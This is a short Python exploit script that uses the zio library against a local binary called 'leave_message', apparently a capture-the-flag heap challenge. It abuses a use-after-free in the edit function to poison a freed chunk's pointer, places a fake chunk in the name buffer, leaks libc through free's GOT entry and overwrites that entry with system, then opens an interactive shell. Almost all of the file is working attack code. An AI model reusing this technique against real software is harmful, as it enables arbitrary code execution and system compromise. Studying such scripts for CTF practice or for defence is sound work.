from zio import *

target          = './leave_message'
read_c          = COLORED(RAW, 'green')
write_c         = COLORED(RAW, 'blue')
io              = zio(target, timeout = 100000000, print_read = read_c, print_write = write_c)

#io.gdb_hint([0x4008bb])
io.gdb_hint([0x400a07])
#io.gdb_hint([0x4009bd])

# mes_num       0x602094
# name          0x6020a0
# mes           0x6020c0
# exploit       malloc 1 -> free 1 -> edit 1 arbitrary fd ->malloc 1 -> malloc arbitrary -> arbitrary write

def leave(mes):
    io.read_until('5. Exit')
    io.writeline('1')
    io.write(mes)
    pass

def show(idx):
    io.read_until('5. Exit')
    io.writeline('2')
    io.read_until('Input show index:\n')
    io.writeline(str(idx))
    pass

def edit(idx, mes):
    io.read_until('5. Exit')
    io.writeline('3')
    io.read_until('Input edit index:')
    io.writeline(str(idx))
    io.write(mes)
    pass

def delete(idx):
    io.read_until('5. Exit')
    io.writeline('4')
    io.read_until('Input delete index:')
    io.writeline(str(idx))
    pass

got_free        = 0x602018
offset_free     = 0x82df0
fake_chunk      = 0x6020a0
offset_system   = 0x46640

io.read_until("What's your name")
io.writeline(l64(0) + l64(0x30) + l64(0x0) )

leave('a'*0x1f)
delete(0)
edit(0, l64(fake_chunk)+'b'*0x17)
leave('AAAA')
leave('A'*0x10 + l64(got_free))

# leak
show(0)
adr_free        = l64(io.read(6) + '\x00\x00')
libc_base       = adr_free - offset_free
adr_system      = libc_base + offset_system

# get shell
leave('/bin/sh')
edit(0, l64(adr_system))

delete(3)

io.interact()
